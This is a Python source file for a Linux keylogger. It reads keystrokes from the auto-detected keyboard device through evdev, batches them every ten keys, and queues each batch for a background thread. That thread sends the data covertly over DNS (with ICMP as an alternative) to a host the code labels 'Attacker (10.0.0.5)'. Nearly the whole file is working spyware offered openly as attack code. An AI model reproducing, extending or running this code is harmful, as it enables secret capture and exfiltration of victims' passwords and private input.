import evdev
from evdev import InputDevice, categorize, ecodes
import threading
import queue
import time

# --- EXFILTRATION MODULES ---
# We import both so you can easily switch between them
from dns_exfil import send_data_over_dns
from icmp_exfil import send_data_over_icmp 

# --- CONFIGURATION ---
# Create a thread-safe Queue to hold keystrokes while sending happens in background
packet_queue = queue.Queue()

def exfiltration_worker():
    """
    This background thread constantly checks if there is data in the queue.
    If data exists, it sends it via ICMP. 
    It runs independently, so it NEVER blocks the keylogger from capturing new keys.
    """
    while True:
        # Block until data is available
        data_chunk = packet_queue.get()
        
        if data_chunk is None: 
            break # Exit signal
            
        # Perform the slow exfiltration here (in background)
        # This takes seconds, but the main loop keeps running!
        try:
            # Current active method: ICMP Timing
            # To switch to DNS, change this to send_data_over_dns(data_chunk)
            #send_data_over_icmp(data_chunk)
            send_data_over_dns(data_chunk)
        except Exception as e:
            print(f"[-] Exfiltration Error: {e}")
            
        packet_queue.task_done()

# Start the background worker thread immediately
worker_thread = threading.Thread(target=exfiltration_worker, daemon=True)
worker_thread.start()

def find_keyboard_path():
    """
    Auto-detects the first device that looks like a keyboard.
    Returns the path string (e.g., '/dev/input/event2') or None.
    """
    try:
        # List all input devices
        devices = [evdev.InputDevice(path) for path in evdev.list_devices()]
        
        for device in devices:
            # Check if "keyboard" is in the device name (case insensitive)
            if "keyboard" in device.name.lower():
                print(f"[*] Auto-detected Keyboard: {device.name} at {device.path}")
                return device.path
        
        print("[-] No keyboard found automatically!")
        return None
    except Exception as e:
        print(f"[-] Error searching for devices: {e}")
        return None

# --- MAIN CONFIGURATION ---

# Instead of hardcoding "/dev/input/event6", we auto-detect it.
KEYBOARD_EVENT = find_keyboard_path()

# Fallback: If auto-detect fails, tell the user to check manually
if not KEYBOARD_EVENT:
    print("[!] Auto-detection failed. Please check your devices using 'ls -l /dev/input/by-path/' or 'sudo evtest'.")
    exit()

try:
    keyboard = InputDevice(KEYBOARD_EVENT)
    print(f"[+] Listening for keystrokes on {KEYBOARD_EVENT}...")
    print(f"[+] Multithreaded Exfiltration Active (No Blocking).")
    print(f"[+] Data will be queued for Attacker (10.0.0.5) every 10 keystrokes.")

    # Buffer to store keys before sending
    keystroke_buffer = ""
    SEND_THRESHOLD = 10  # Send data after every 10 keys

    for event in keyboard.read_loop():
        if event.type == ecodes.EV_KEY:
            key_event = categorize(event)
            if key_event.keystate == key_event.key_down:

                # 1. Clean the key name (Remove "KEY_" prefix)
                raw_key = key_event.keycode
                # Sometimes keycode is a list [KEY_A, ...], handle that just in case
                if isinstance(raw_key, list):
                    raw_key = raw_key[0]
                
                clean_key = str(raw_key).replace("KEY_", "")

                # Handle space and enter for better readability
                if clean_key == "SPACE": clean_key = " "
                elif clean_key == "ENTER": clean_key = "[E]"
                elif clean_key == "BACKSPACE": clean_key = "<"
                elif "SHIFT" in clean_key: clean_key = "" # Ignore shift keys for cleaner logs

                # 2. Add to buffer
                keystroke_buffer += clean_key
                # Optional: Print locally for debugging (remove in real attack)
                print(f"Buffer: {keystroke_buffer}   ", end="\r") 

                # 3. Check if buffer is full, then QUEUE IT
                if len(keystroke_buffer) >= SEND_THRESHOLD:
                    print(f"\n[+] Queueing Batch: {keystroke_buffer}")
                    
                    # --- CRITICAL CHANGE ---
                    # Instead of calling send_data_over_icmp() directly (which blocks),
                    # we put the data into the queue. The worker thread handles it.
                    packet_queue.put(keystroke_buffer)
                    
                    keystroke_buffer = "" # Reset buffer immediately

except KeyboardInterrupt:
    print("\n[+] Keylogger stopped cleanly.")
except OSError:
    print(f"\n[!] Error: Could not access {KEYBOARD_EVENT}. Did you run with 'sudo'?")
except Exception as e:
    print(f"\n[!] Unexpected Error: {e}")
